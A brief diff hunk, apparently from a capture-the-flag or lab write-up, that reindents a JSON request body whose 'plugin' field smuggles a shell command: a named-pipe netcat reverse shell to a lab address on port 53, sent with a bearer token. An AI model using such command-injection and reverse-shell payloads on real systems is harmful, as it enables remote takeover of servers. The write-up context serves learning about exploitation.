@@ -120,7 +120,7 @@ Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pb
 Content-Length: 135
 
 {
-"plugin":"documentation && $(mkfifo backpipe; /bin/bash < backpipe | nc 10.10.14.26 53 > backpipe ; rm backpipe)",
-"port":"1337"
+  "plugin":"documentation && $(mkfifo backpipe; /bin/bash < backpipe | nc 10.10.14.26 53 > backpipe ; rm backpipe)",
+  "port":"1337"
 }
 ````
